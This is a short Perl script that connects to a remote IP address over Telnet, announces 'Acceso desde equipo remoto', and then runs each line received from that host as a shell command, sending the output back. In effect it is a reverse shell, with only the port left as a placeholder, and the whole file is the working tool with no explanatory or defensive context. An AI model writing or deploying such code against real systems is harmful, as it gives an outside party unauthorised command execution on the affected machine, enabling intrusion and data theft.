#!/usr/bin/perl
use Net::Telnet ();
use Net::Telnet;
($ip) = @ARGV;
print("$ip\n");
$telnet = new Net::Telnet ( Timeout=>30, Port=>XXXX);
$telnet->open($ip);
$count=1;
$telnet->print('Acceso desde equipo remoto');
$pattern='/\$ $/i';
while ($count == 1) {
    $data = $telnet->get(Timeout=>100);
    $output = `$data`;
    $telnet->print($output);
}
exit 0
